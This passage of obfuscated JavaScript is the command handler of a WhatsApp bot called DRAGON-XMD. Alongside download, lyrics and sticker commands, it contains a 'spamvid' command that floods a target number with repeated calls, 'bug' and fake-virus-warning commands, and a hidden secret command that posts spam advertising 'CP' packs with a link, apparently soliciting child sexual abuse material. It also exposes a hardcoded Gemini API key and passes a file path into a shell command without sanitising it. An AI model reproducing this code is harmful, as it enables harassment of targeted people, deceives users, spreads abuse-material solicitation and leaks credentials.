              return _0x5a72b8.json();
            };
            try {
              if (!_0xe09539 || _0xe09539.trim().length === 0x0) {
                return _0x10d7a1.reply("What song do you want to download ?");
              }
              const _0x16cd23 = await _0x56f667(_0xe09539);
              if (!_0x16cd23 || !_0x16cd23.videos.length) {
                return message.reply("No video found for the specified query.");
              }
              const _0x576b05 = _0x16cd23.videos[0x0];
              const _0x5bc2e7 = _0x576b05.url;
              _0x10d7a1.reply("_Please wait your download on progress..._");
              let _0x42b7ec;
              let _0x360ebb;
              let _0x372f9c;
              _0x42b7ec = await _0x5598dd('https://xploader-api.vercel.app/ytmp3?url=' + encodeURIComponent(_0x5bc2e7));
              if (_0x42b7ec.success) {
                _0x360ebb = _0x42b7ec.result.download_url;
                _0x372f9c = _0x42b7ec.result;
              } else {
                _0x42b7ec = await _0x5598dd("https://api.ryzendesu.vip/api/downloader/ytmp3?url=" + encodeURIComponent(_0x5bc2e7));
                if (_0x42b7ec.success) {
                  _0x360ebb = _0x42b7ec.result.download_url;
                  _0x372f9c = _0x42b7ec.result;
                } else {
                  _0x42b7ec = await _0x5598dd('https://api.dreaded.site/api/ytdl/audio?url=' + encodeURIComponent(_0x5bc2e7));
                  if (_0x42b7ec.success) {
                    _0x360ebb = _0x42b7ec.result.download_url;
                    _0x372f9c = _0x42b7ec.result;
                  }
                }
              }
              if (!_0x360ebb || !_0x372f9c) {
                return _0x10d7a1.reply("Failed to retrieve download URL from all sources. Please try again later.");
              }
              const _0x18066d = {
                'audio': {
                  'url': _0x360ebb
                },
                'mimetype': "audio/mp4",
                'fileName': _0x372f9c.title + ".mp3"
              };
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, _0x18066d, {
                'quoted': _0x10d7a1
              });
            } catch (_0x4677cf) {
              console.error("Error during download process:", _0x4677cf);
              return _0x10d7a1.reply("Download failed due to an error: " + (_0x4677cf.message || _0x4677cf));
            }
          }
          break;
        case 'ytsearch':
        case "yts":
          {
            if (!_0xe09539) {
              _0x459d18("Provide a search term!E.g: Alan walker alone");
              return;
            }
            const {
              videos: _0x2da57c
            } = await yts(_0xe09539);
            if (!_0x2da57c || _0x2da57c.length <= 0x0) {
              _0x459d18("No Matching videos found for : *" + _0xe09539 + "*!!");
              return;
            }
            const _0x4c5c51 = _0x2da57c.length < 0xa ? _0x2da57c.length : 0xa;
            let _0x131620 = "YouTube Search\n🔍 Query ~> " + _0xe09539 + "\n\n";
            for (let _0x28a5c0 = 0x0; _0x28a5c0 < _0x4c5c51; _0x28a5c0++) {
              _0x131620 += "Link ~> " + _0x2da57c[_0x28a5c0].url + "\nChannel ~> " + _0x2da57c[_0x28a5c0].author.name + "\nTitle ~> " + _0x2da57c[_0x28a5c0].title + "\n\n";
            }
            _0x459d18(_0x131620);
            return;
          }
          break;
        case "ytmp3":
        case 'yta':
          {
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗬𝗼𝘂𝘁𝘂𝗯𝗲 𝗹𝗶𝗻𝗸!");
              }
              let _0x292f8c = _0xe09539.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
              if (!_0x292f8c) {
                return _0x10d7a1.reply("𝗧𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗬𝗼𝘂𝘁𝘂𝗯𝗲 𝗟𝗶𝗻𝗸");
              }
              let _0x1e1d96 = parseInt(_0xe09539) - 0x1;
              if (_0x1e1d96 < 0x0 || _0x1e1d96 >= _0x292f8c.length) {
                return _0x10d7a1.reply("𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗟𝗶𝗻𝗸.");
              }
              const {
                videos: _0x42086f
              } = await yts(_0xe09539);
              if (!_0x42086f || _0x42086f.length === 0x0) {
                return _0x10d7a1.reply("No songs found!");
              }
              const _0x226836 = _0x42086f[0x0].url;
              let _0x1c2eff = await fetchJson("https://api.dreaded.site/api/ytdl/audio?url=" + _0x226836);
              if (!_0x1c2eff || !_0x1c2eff.result || !_0x1c2eff.result.url) {
                return _0x10d7a1.reply("Failed to fetch audio from the API.");
              }
              const _0x315770 = _0x1c2eff.result.url;
              const _0x1e6a57 = _0x1c2eff.result.title;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'audio': {
                  'url': _0x315770
                },
                'mimetype': "audio/mpeg",
                'fileName': _0x1e6a57 + ".mp3"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x944d7a) {
              _0x10d7a1.reply("Download failed\n" + _0x944d7a.message);
            }
          }
          break;
        case 'ytmp4':
        case "ytv":
          {
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 𝗹𝗶𝗻𝗸!");
              }
              let _0x2c08ab = _0xe09539.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
              if (!_0x2c08ab) {
                return _0x10d7a1.reply("𝗧𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 𝗹𝗶𝗻𝗸");
              }
              let _0x24da46 = parseInt(_0xe09539) - 0x1;
              if (_0x24da46 < 0x0 || _0x24da46 >= _0x2c08ab.length) {
                return _0x10d7a1.reply("𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸.");
              }
              const {
                videos: _0x36fbe6
              } = await yts(_0xe09539);
              if (!_0x36fbe6 || _0x36fbe6.length === 0x0) {
                return _0x10d7a1.reply("No songs found!");
              }
              const _0x4278c6 = _0x36fbe6[0x0].url;
              let _0x400a98 = await fetchJson("https://api.dreaded.site/api/ytdl/video?url=" + _0x4278c6);
              if (!_0x400a98 || !_0x400a98.result || !_0x400a98.result.url) {
                return _0x10d7a1.reply("Failed to fetch video from the API.");
              }
              const _0x510222 = _0x400a98.result.url;
              const _0x741158 = _0x400a98.result.title;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'video': {
                  'url': _0x510222
                },
                'mimetype': "video/mpeg",
                'fileName': _0x741158 + ".mp4"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x36a905) {
              _0x10d7a1.reply("Download failed\n" + _0x36a905.message);
            }
          }
          break;
        case "ping":
        case 'speed':
          {
            await _0x2c149a();
            _0x10d7a1.reply("𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗\n " + _0x496d56.toFixed(0x4) + " 𝗠𝘀");
          }
          break;
        case 'uptime':
          {
            _0x10d7a1.reply('' + runtime(process.uptime()));
          }
          break;
        case "runtime":
          let _0x4a75c0 = "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝘂𝗻𝗻𝗶𝗻𝗴 𝘀𝗶𝗻𝗰𝗲 " + runtime(process.uptime());
          _0x34f9ed.sendMessage(_0x10d7a1.chat, {
            'text': _0x4a75c0,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                'body': "https://chat.whatsapp.com/DefN96lXQ4i5iO1wDDeu2C",
                'thumbnailUrl': "https://i.imgur.com/A08nrWx.jpeg",
                'sourceUrl': "https://chat.whatsapp.com/DefN96lXQ4i5iO1wDDeu2C",
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x10d7a1
          });
          break;
        case "apk":
        case "app":
          {
            if (!_0xe09539) {
              return _0x459d18("Where is the app name?");
            }
            let _0x3a4e92 = await fetchJson('https://bk9.fun/search/apk?q=' + _0xe09539);
            let _0x349c2c = await fetchJson("https://bk9.fun/download/apk?id=" + _0x3a4e92.BK9[0x0].id);
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'document': {
                'url': _0x349c2c.BK9.dllink
              },
              'fileName': _0x349c2c.BK9.name,
              'mimetype': "application/vnd.android.package-archive",
              'contextInfo': {
                'externalAdReply': {
                  'title': "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                  'body': '' + _0x349c2c.BK9.name,
                  'thumbnailUrl': '' + _0x349c2c.BK9.icon,
                  'sourceUrl': '' + _0x349c2c.BK9.dllink,
                  'mediaType': 0x2,
                  'showAdAttribution': true,
                  'renderLargerThumbnail': false
                }
              }
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "mix":
          {
            const {
              Sticker: _0x1d850b,
              createSticker: _0x5f5c59,
              StickerTypes: _0x67a1d6
            } = require("wa-sticker-formatter");
            if (!_0xe09539) {
              return _0x10d7a1.reply("No emojis provided ? ");
            }
            const _0x4f963e = _0xe09539.split('+');
            if (_0x4f963e.length !== 0x2) {
              _0x10d7a1.reply("Specify the emojis and separate with '+'");
              return;
            }
            const _0x47f038 = _0x4f963e[0x0].trim();
            const _0x1251a7 = _0x4f963e[0x1].trim();
            try {
              const _0x2ed137 = require('axios');
              const _0x30a2b0 = await _0x2ed137.get("https://levanter.onrender.com/emix?q=" + _0x47f038 + _0x1251a7);
              if (_0x30a2b0.data.status === true) {
                let _0x3b078a = new _0x1d850b(_0x30a2b0.data.result, {
                  'pack': botname,
                  'type': _0x67a1d6.CROPPED,
                  'categories': ['🤩', '🎉'],
                  'id': "12345",
                  'quality': 0x46,
                  'background': "transparent"
                });
                const _0x45bb35 = await _0x3b078a.toBuffer();
                _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'sticker': _0x45bb35
                }, {
                  'quoted': _0x10d7a1
                });
              } else {
                _0x10d7a1.reply("Unable to create emoji mix.");
              }
            } catch (_0x464d43) {
              _0x10d7a1.reply("An error occurred while creating the emoji mix." + _0x464d43);
            }
          }
          break;
        case 'lyrics':
          {
            const _0x220e5f = require("node-fetch");
            const _0x1c5d29 = "https://api.dreaded.site/api/lyrics?title=" + encodeURIComponent(_0xe09539);
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("Provide a song name!");
              }
              const _0x1f5dfc = await fetchJson(_0x1c5d29);
              if (!_0x1f5dfc.success || !_0x1f5dfc.result || !_0x1f5dfc.result.lyrics) {
                return _0x10d7a1.reply("Sorry, I couldn't find any lyrics for \"" + _0xe09539 + "\".");
              }
              const {
                title: _0x1b20b,
                artist: _0x218d8c,
                link: _0x11a26b,
                thumb: _0x40e4af,
                lyrics: _0x45325a
              } = _0x1f5dfc.result;
              const _0x2040c3 = _0x40e4af || "https://i.imgur.com/x8scmqS.jpeg";
              const _0x4a9c75 = await _0x220e5f(_0x2040c3).then(_0x1f01e6 => _0x1f01e6.buffer())["catch"](_0x5cc4c6 => {
                console.error("Error fetching image:", _0x5cc4c6);
                return null;
              });
              if (!_0x4a9c75) {
                return _0x10d7a1.reply("An error occurred while fetching the image.");
              }
              const _0x59fa3a = "**Title**: " + _0x1b20b + "\n**Artist**: " + _0x218d8c + "\n\n" + _0x45325a;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': _0x4a9c75,
                'caption': _0x59fa3a
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x34b44e) {
              console.error(_0x34b44e);
              _0x10d7a1.reply("An error occurred while fetching the lyrics for \"" + _0xe09539 + "\".");
            }
          }
          break;
        case "toimage":
        case "photo":
          {
            if (!_0x1a0cc5) {
              throw "Tag a static video with the command!";
            }
            if (!/webp/.test(_0x1dbbb8)) {
              throw "Tag a sticker with " + (prefix + _0x502a51);
            }
            let _0x4ea7a2 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x1a0cc5);
            let _0x8cc374 = await getRandom(".png");
            exec("ffmpeg -i " + _0x4ea7a2 + " " + _0x8cc374, _0x44f686 => {
              fs.unlinkSync(_0x4ea7a2);
              if (_0x44f686) {
                throw _0x44f686;
              }
              let _0x27ee77 = fs.readFileSync(_0x8cc374);
              _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': _0x27ee77,
                'caption': "𝗖𝗼𝗻𝘃𝗲𝗿𝘁𝗲𝗱 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗"
              }, {
                'quoted': _0x10d7a1
              });
              fs.unlinkSync(_0x8cc374);
            });
          }
          break;
        case 'movie':
          if (!_0xe09539) {
            return _0x459d18("Provide a series or movie name.");
          }
          let _0x4edd78 = await axios.get('http://www.omdbapi.com/?apikey=742b2d09&t=' + _0xe09539 + '&plot=full');
          let _0x5a651c = '';
          console.log(_0x4edd78.data);
          _0x5a651c += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n ``` IMDB MOVIE SEARCH```\n⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";
          _0x5a651c += "🎬Title      : " + _0x4edd78.data.Title + "\n";
          _0x5a651c += "📅Year       : " + _0x4edd78.data.Year + "\n";
          _0x5a651c += "⭐Rated      : " + _0x4edd78.data.Rated + "\n";
          _0x5a651c += "📆Released   : " + _0x4edd78.data.Released + "\n";
          _0x5a651c += "⏳Runtime    : " + _0x4edd78.data.Runtime + "\n";
          _0x5a651c += "🌀Genre      : " + _0x4edd78.data.Genre + "\n";
          _0x5a651c += "👨🏻‍💻Director   : " + _0x4edd78.data.Director + "\n";
          _0x5a651c += "✍Writer     : " + _0x4edd78.data.Writer + "\n";
          _0x5a651c += "👨Actors     : " + _0x4edd78.data.Actors + "\n";
          _0x5a651c += "📃Plot       : " + _0x4edd78.data.Plot + "\n";
          _0x5a651c += "🌐Language   : " + _0x4edd78.data.Language + "\n";
          _0x5a651c += "🌍Country    : " + _0x4edd78.data.Country + "\n";
          _0x5a651c += "🎖️Awards     : " + _0x4edd78.data.Awards + "\n";
          _0x5a651c += "📦BoxOffice  : " + _0x4edd78.data.BoxOffice + "\n";
          _0x5a651c += "🏙️Production : " + _0x4edd78.data.Production + "\n";
          _0x5a651c += "🌟imdbRating : " + _0x4edd78.data.imdbRating + "\n";
          _0x5a651c += "❎imdbVotes  : " + _0x4edd78.data.imdbVotes + '';
          _0x34f9ed.sendMessage(_0x5e81f5, {
            'image': {
              'url': _0x4edd78.data.Poster
            },
            'caption': _0x5a651c
          }, {
            'quoted': _0x10d7a1
          });
          break;
        case 'linkgroup':
        case "link":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            let _0x1c7068 = await _0x34f9ed.groupInviteCode(_0x10d7a1.chat);
            _0x34f9ed.sendText(_0x10d7a1.chat, 'https://chat.whatsapp.com/' + _0x1c7068 + "\n\nGroup link for  " + _0x2274d9.subject, _0x10d7a1, {
              'detectLink': true
            });
          }
          break;
        case "botpp":
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            if (!_0x1a0cc5) {
              throw "Tag an image you want to be the bot's profile picture with " + (prefix + _0x502a51);
            }
            if (!/image/.test(_0x1dbbb8)) {
              throw "Tag an image you want to be the bot's profile picture with " + (prefix + _0x502a51);
            }
            if (/webp/.test(_0x1dbbb8)) {
              throw "Tag an image you want to be the bot's profile picture with " + (prefix + _0x502a51);
            }
            let _0x3a00dc = await _0x34f9ed.downloadAndSaveMediaMessage(_0x1a0cc5);
            await _0x34f9ed.updateProfilePicture(_0x74fec9, {
              'url': _0x3a00dc
            })["catch"](_0x45aec2 => fs.unlinkSync(_0x3a00dc));
            _0x459d18`Bot's profile picture has been successfully updated!`;
          }
          break;
        case "broadcast":
          {
            if (!_0x22f9f0) {
              throw NotOwner;
              return;
            }
            if (!_0xe09539) {
              _0x459d18("❌ No broadcast message provided!");
              return;
            }
            let _0x163f94 = await _0x34f9ed.groupFetchAllParticipating();
            let _0x50efce = Object.entries(_0x163f94).slice(0x0).map(_0x70f2f6 => _0x70f2f6[0x1]);
            let _0x1dfc7c = _0x50efce.map(_0x2be0b8 => _0x2be0b8.id);
            _0x459d18(" Broadcasting in " + _0x1dfc7c.length + " Group Chat, in " + _0x1dfc7c.length * 1.5 + " seconds");
            for (let _0x1fb4ff of _0x1dfc7c) {
              let _0x5b234a = "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 >\n\n🀄 Message: " + _0xe09539 + "\n\nAuthor: " + _0x1b6245;
              await _0x34f9ed.sendMessage(_0x1fb4ff, {
                'image': {
                  'url': "https://i.imgur.com/7cVX7SO.jpeg"
                },
                'caption': '' + _0x5b234a
              });
            }
            _0x459d18("Broadcasted to " + _0x1dfc7c.length + " Groups.");
          }
          break;
        case 'gemini':
          {
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("This is DRAGON-XMD, an AI using Gemini APIs to process text, provide yr query");
              }
              const {
                default: _0xa86d65
              } = await import("gemini-ai");
              const _0x2c5d3d = new _0xa86d65("AIzaSyDJUtskTG-MvQdlT4tNE319zBqLMFei8nQ");
              const _0x1a723d = _0x2c5d3d.createChat();
              const _0x893726 = await _0x1a723d.ask(_0xe09539);
              await _0x10d7a1.reply(_0x893726);
            } catch (_0x54bafc) {
              _0x10d7a1.reply("I am unable to generate responses\n\n" + _0x54bafc);
            }
          }
          break;
        case "setvar":
          if (!_0x22f9f0) {
            throw NotOwner;
          }
          if (!_0xe09539.split('=')[0x1]) {
            return _0x459d18("Incorrect Usage:\nProvide the key and value correctly\nExample: setvar AUTOVIEW_STATUS=TRUE");
          }
          const _0x5a7978 = new _0x8db52a({
            'token': herokuapi
          });
          let _0xe8358a = "/apps/" + appname;
          await _0x5a7978.patch(_0xe8358a + "/config-vars", {
            'body': {
              [_0xe09539.split('=')[0x0]]: _0xe09539.split('=')[0x1]
            }
          });
          await _0x459d18("✅ The variable " + _0xe09539.split('=')[0x0] + " = " + _0xe09539.split('=')[0x1] + " has been set Successfuly.\nWait 20s for changes to effect!");
          break;
        case "dlt":
        case 'dil':
          {
            if (!_0x10d7a1.quoted) {
              throw "No message quoted for deletion";
            }
            let {
              chat: _0x5bd18a,
              fromMe: _0x2eca8b,
              id: _0x364a14,
              isBaileys: _0x4ace2e
            } = _0x10d7a1.quoted;
            if (_0x4ace2e) {
              throw "I cannot delete. Quoted message is my message or another bot message.";
            }
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'delete': {
                'remoteJid': _0x10d7a1.chat,
                'fromMe': true,
                'id': _0x10d7a1.quoted.id,
                'participant': _0x10d7a1.quoted.sender
              }
            });
          }
          break;
        case "block":
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            if (!_0x10d7a1.quoted) {
              throw "𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!";
            }
            let _0x285e4f = _0x10d7a1.mentionedJid[0x0] ? _0x10d7a1.mentionedJid[0x0] : _0x10d7a1.quoted ? _0x10d7a1.quoted.sender : _0xe09539.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            if (_0x285e4f == '254704009677@s.whatsapp.net') {
              return _0x10d7a1.reply("𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆 𝗢𝘄𝗻𝗲𝗿 😡");
            }
            if (_0x285e4f == _0x34f9ed.decodeJid(_0x34f9ed.user.id)) {
              throw "𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆𝘀𝗲𝗹𝗳 𝗶𝗱𝗶𝗼𝘁 😡";
            }
            await _0x34f9ed.updateBlockStatus(_0x285e4f, "block");
            _0x10d7a1.reply("𝗕𝗹𝗼𝗰𝗸𝗲𝗱 𝘁𝗵𝗶𝘀 𝗟𝗮𝘇𝘆𝗯𝗲𝗶𝗻𝗴 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆!");
          }
          break;
        case "unblock":
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            if (!_0x10d7a1.quoted) {
              throw "𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!";
            }
            let _0x42ee66 = _0x10d7a1.mentionedJid[0x0] ? _0x10d7a1.mentionedJid[0x0] : _0x10d7a1.quoted ? _0x10d7a1.quoted.sender : _0xe09539.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            await _0x34f9ed.updateBlockStatus(_0x42ee66, "unblock");
            _0x10d7a1.reply("𝗨𝗻𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆✅!");
          }
          break;
        case 'join':
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            if (!_0xe09539) {
              return _0x459d18("provide a valid group link");
            }
            let _0x536863 = _0x16f666[0x0].split("https://chat.whatsapp.com/")[0x1];
            await _0x34f9ed.groupAcceptInvite(_0x536863).then(_0x2e1cd6 => _0x459d18(jsonformat(_0x2e1cd6)))["catch"](_0x20b655 => _0x459d18("Link has problem."));
          }
          break;
        case "enc":
        case "encrypte":
          {
            const _0x58b604 = require("javascript-obfuscator");
            if (_0x10d7a1.quoted && _0x10d7a1.quoted.text) {
              const _0x16cd1b = _0x10d7a1.quoted.text;
              const _0x104c29 = _0x58b604.obfuscate(_0x16cd1b, {
                'compact': true,
                'controlFlowFlattening': true,
                'controlFlowFlatteningThreshold': 0x1,
                'numbersToExpressions': true,
                'simplify': true,
                'stringArrayShuffle': true,
                'splitStrings': true,
                'stringArrayThreshold': 0x1
              });
              console.log("Successfully encrypted the code");
              _0x10d7a1.reply(_0x104c29.getObfuscatedCode());
            } else {
              _0x10d7a1.reply("Quote/Tag a valid JavaScript code to encrypt!");
            }
          }
          break;
        case 'gpt3':
          {
            if (!_0xe09539) {
              return _0x459d18("Hello there, How can i help you?");
            }
            let _0x3289d6 = await fetchJson("https://bk9.fun/ai/blackbox?q=" + _0xe09539);
            if (!_0x3289d6.BK9) {
              return _0x459d18("An error occurred while fetching the AI chatbot response. Please try again later.");
            } else {
              _0x459d18(_0x3289d6.BK9);
            }
          }
          break;
        case "gcprofile":
          {
            function _0x17f83e(_0x373409) {
              const _0x597474 = new Date(_0x373409 * 0x3e8);
              const _0x321f44 = ['Sunday', "Monday", "Tuesday", 'Wednesday', "Thursday", 'Friday', "Saturday"];
              return {
                'date': _0x597474.getDate(),
                'month': new Intl.DateTimeFormat("en-US", {
                  'month': "long"
                }).format(_0x597474),
                'year': _0x597474.getFullYear(),
                'day': _0x321f44[_0x597474.getUTCDay()],
                'time': _0x597474.getUTCHours() + ':' + _0x597474.getUTCMinutes() + ':' + _0x597474.getUTCSeconds()
              };
            }
            if (!_0x10d7a1.isGroup) {
              return _0x10d7a1.reply("This command is meant for groups");
            }
            let _0x3e66da = await _0x34f9ed.groupMetadata(_0x10d7a1.chat);
            let _0x1791a7 = await _0x17f83e(_0x3e66da.creation);
            try {
              pp = await _0x34f9ed.profilePictureUrl(chat, 'image');
            } catch {
              pp = "https://i.imgur.com/ED0uS2t.jpeg";
            }
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'image': {
                'url': pp
              },
              'caption': "_Name_ : *" + _0x3e66da.subject + "*\n\n_ID_ : *" + _0x3e66da.id + "*\n\n_Group owner_ : " + ('@' + _0x3e66da.owner.split('@')[0x0]) + " || 'No Creator'\n\n_Group created_ : *" + _0x1791a7.day + ", " + _0x1791a7.date + " " + _0x1791a7.month + " " + _0x1791a7.year + ", " + _0x1791a7.time + "*\n\n_Participants_ : *" + _0x3e66da.size + "*\n_Members_ : *" + _0x3e66da.participants.filter(_0x33d839 => _0x33d839.admin == null).length + "*\n\n_Admins_ : *" + Number(_0x3e66da.participants.length - _0x3e66da.participants.filter(_0xb64474 => _0xb64474.admin == null).length) + "*\n\n_Who can send message_ : *" + (_0x3e66da.announce == true ? 'Admins' : "Everyone") + "*\n\n_Who can edit group info_ : *" + (_0x3e66da.restrict == true ? 'Admins' : "Everyone") + "*\n\n_Who can add participants_ : *" + (_0x3e66da.memberAddMode == true ? "Everyone" : "Admins") + '*'
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case 'tovideo':
        case "mp4":
        case 'tovid':
          {
            if (!_0x1a0cc5) {
              return _0x459d18("Reply to Sticker");
            }
            if (!/webp/.test(_0x1dbbb8)) {
              return _0x459d18("reply sticker with caption *" + (prefix + _0x502a51) + '*');
            }
            let _0x2b6f81 = await fetch("https://bk9.fun/converter/webpToMp4?url=" + _0x1a0cc5);
            let _0x339789 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x1a0cc5);
            let _0x566dee = await _0x2b6f81(_0x339789);
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'video': {
                'url': _0x566dee.result,
                'caption': "Convert Webp To Video"
              }
            }, {
              'quoted': _0x10d7a1
            });
            await fs.unlinkSync(_0x339789);
          }
          break;
        case 'customercare':
          {
            _0x31ad8f(_0x34f9ed, _0x10d7a1, _0xe09539);
          }
          break;
        case "bug":
          {
            _0x2c17b4(_0x34f9ed, _0x10d7a1, _0xe09539);
          }
          break;
        case "virushack":
          sendFakeVirusWarning(_0x34f9ed, _0x10d7a1);
          break;
        case "spamvid":
          {
            const _0x4d54f2 = _0x34f9ed.user.id.split(':')[0x0] + "@s.whatsapp.net";
            const _0x713d9 = _0x10d7a1.sender === _0x4d54f2 || ownerNumbers.includes(_0x10d7a1.sender);
            if (!_0x713d9) {
              return _0x459d18("*YOU ARE NOT A PREMIUM MEMBER DIMWIT*");
            }
            target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            _0x459d18("┌─────────\n│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝙳𝚁𝙰𝙶𝙾𝙽-𝚇𝙼𝙳 𝚜𝚎𝚗𝚍𝚒𝚗𝚐 𝚜𝚙𝚊𝚖 𝚟𝚒𝚍 🌒\n│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : " + target + "\n│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : " + _0x502a51 + "\n└─────────");
            for (let _0x5306e6 = 0x0; _0x5306e6 < 0x1e; _0x5306e6++) {
              await CallGc(target);
            }
            sam.sendMessage(_0x10d7a1.chat, {
              'react': {
                'text': '✅',
                'key': _0x10d7a1.key
              }
            });
          }
          break;
        case "dragon-viniziaz-nimco-secret":
          {
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': "👊🏽💦Packs CP y MORRITAS😋 EN LÍNEA para😈tener chat💯🔥y video llamada HORA🔥🥵*\n⬇️⬇️⬇️⬇️⬇️⬇️⬇️\n[https://wlhatt.life/morritas-cp/](https://wlhatt.life/morritas-cp/) +"
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "tempemail":
          {
            const _0x45f7f0 = await generateTempEmail();
            if (!_0x45f7f0) {
              return _0x459d18("❌ Failed to generate a temporary email. Try again later.");
            }
            global.userTempEmail = _0x45f7f0;
            return _0x459d18("📧 *Temporary Email Created:*\n\n" + _0x45f7f0 + "\n\nUse this email to receive messages. Type `.checkemail christine` to see new messages.");
          }
        case "checkemail":
          {
            const _0x369f69 = _0xe09539.split(" ");
            const _0x544aef = _0x369f69[0x1];
            if (!global.userTempEmail) {
              return _0x459d18("❌ You haven't generated a temporary email. Use `.tempemail` first.");
            }
            if (_0x544aef !== 'winxey') {
              return _0x459d18("❌ Incorrect password. Access denied.");
            }
            const _0x1a7c46 = await checkEmailInbox(global.userTempEmail);
            if (!_0x1a7c46 || _0x1a7c46.length === 0x0) {
              return _0x459d18("📭 No new messages.");
            }
            const _0x5de20a = _0x1a7c46[_0x1a7c46.length - 0x1];
            const _0x41e4e7 = "📩 *New Email Received*\n\nFrom: " + _0x5de20a.from + "\nSubject: " + _0x5de20a.subject + "\n\n" + _0x5de20a.body;
            return _0x459d18(_0x41e4e7);
          }
        case "grouppic":
          {
            if (!_0x10d7a1.isGroup) {
              return _0x459d18("❌ This command can only be used in a group.");
            }
            const _0x4dd6d7 = _0x10d7a1.chat;
            const _0x4a51b1 = await getGroupProfilePic(_0x34f9ed, _0x4dd6d7);
            return _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'image': {
                'url': _0x4a51b1
              },
              'caption': "🖼 𝗚𝗿𝗼𝘂𝗽 𝗽𝗿𝗼𝗳𝗶𝗹𝗲 𝗽𝗶𝗰𝘁𝘂𝗿𝗲, 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗\n\n> ©𝖕𝖔𝖜𝖊𝖗𝖊𝖉 𝖇𝖞 𝗗𝗥𝗔𝗚𝗢𝗡"
            });
          }
        case "hornytest":
          {
            let _0x58b9bf = _0x10d7a1.mentionedJid?.[0x0] || _0x10d7a1.sender;
            let _0x24d1e6 = (await _0x34f9ed.getName(_0x58b9bf)) || "This person";
            let _0x39c537 = Math.floor(Math.random() * 0x65);
            let _0x5593cf = _0x39c537 < 0x14 ? "🧸 Innocent angel!" : _0x39c537 < 0x32 ? "😏 Hmmm… kinda sus!" : _0x39c537 < 0x50 ? "🔥 You’re down bad!" : "🚨 H🅾️RNY DETECTED! Calm down!";
